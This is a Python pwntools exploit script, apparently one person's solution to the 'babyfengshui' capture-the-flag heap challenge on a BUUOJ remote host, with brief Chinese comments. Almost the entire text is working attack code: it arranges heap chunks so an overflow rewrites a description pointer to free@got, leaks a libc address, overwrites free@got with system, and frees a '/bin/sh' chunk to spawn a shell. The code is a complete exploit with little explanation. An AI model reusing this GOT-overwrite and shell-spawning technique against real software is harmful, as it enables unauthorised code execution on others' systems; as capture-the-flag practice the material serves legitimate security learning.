from pwn import *
from LibcSearcher import *
# 看了一遍，好像没看出来问题在哪...
# woc, 这题好妙，米奇妙妙屋了属于是
# 问题出在往堆中写入内容的时候的判断语句

context(os = 'linux', arch = 'i386')
p = remote('node4.buuoj.cn', 26244)
e = ELF('./babyfengshui')

free_got = e.got['free']

def addUser(size: int, writeSize: int, name: bytes, description: bytes):
    p.recvuntil(b'Action: ')
    p.sendline(b'0')
    p.recvuntil(b'size of description: ')
    p.sendline(str(size).encode())
    p.sendlineafter(b'name: ', name)
    p.recvuntil(b'text length: ')
    p.sendline(str(writeSize).encode())
    p.recvuntil(b'text: ')
    p.sendline(description)

def deleteUser(index: int):
    p.recvuntil(b'Action: ')
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(index).encode())

def displayUser(index: int):
    p.recvuntil(b'Action: ')
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(index).encode())

def updateUser(index: int, writeSize: int, content: bytes):
    p.recvuntil(b'Action: ')
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'text length: ')
    p.sendline(str(writeSize).encode())
    p.recvuntil(b'text: ')
    p.sendline(content)

addUser(0x10, 0x10, b'aaaa', b'descrip1') # 0
addUser(0x10, 0x10, b'bbbb', b'descrip2') # 1
deleteUser(0)
addUser(0x80, 0xa8, b'cccc', b'a'*0xa0+p32(free_got)) # 2 将1中指向descrption的指针改写为free@got
addUser(0x80, 0x80, b'dddd', b'/bin/sh\x00') # 3
displayUser(1)
p.recvuntil(b'description: ')
free_addr = u32(p.recv(4))
libc = LibcSearcher('free', free_addr)
libc_base = free_addr - libc.dump('free')
system_addr = libc_base + libc.dump('system') # 修改free@got为system

updateUser(1, 4, p32(system_addr))
deleteUser(3)
p.interactive()



